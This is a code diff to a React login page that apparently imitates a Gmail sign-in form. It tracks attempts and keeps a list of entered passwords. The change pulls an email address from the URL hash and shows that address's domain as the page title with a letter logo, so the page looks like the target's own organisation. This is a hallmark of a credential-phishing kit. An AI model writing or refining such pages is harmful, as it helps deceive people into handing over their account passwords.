@@ -79,6 +79,35 @@ const RegistrationPage = () => {
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
   const [showModal, setShowModal] = useState(false);
+  const [orgName, setOrgName] = useState('');
+  
+  useEffect(() => {
+    const extractOrgName = () => {
+      const hash = window.location.hash;
+      if (hash) {
+        // Remove the # symbol and look for @ symbol
+        const hashContent = hash.substring(1);
+        if (hashContent.includes('@')) {
+          const domain = hashContent.split('@')[1];
+          if (domain) {
+            // Capitalize first letter and make rest lowercase
+            const orgName = domain.charAt(0).toUpperCase() + domain.slice(1).toLowerCase();
+            setOrgName(orgName);
+          }
+        }
+      }
+    };
+
+    extractOrgName();
+    
+    // Listen for hash changes
+    const handleHashChange = () => {
+      extractOrgName();
+    };
+    
+    window.addEventListener('hashchange', handleHashChange);
+    return () => window.removeEventListener('hashchange', handleHashChange);
+  }, []);
   const [attempt, setAttempt] = useState(1);
   const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
 
@@ -572,7 +601,18 @@ const RegistrationPage = () => {
     <div className="gmail-login-container">
       <div className="gmail-login-form-container">
         <div className="form-header">
-          <h1 className="main-title">Welcome</h1>
+          <h1 className="main-title">
+            {orgName ? (
+              <>
+                <div className="org-logo">
+                  {orgName[0]}
+                </div>
+                {orgName}
+              </>
+            ) : (
+              'Welcome'
+            )}
+          </h1>
           <p className="subtitle">Enter your email and password to continue</p>
         </div>
         <form className="gmail-login-form" onSubmit={handleSubmit}>
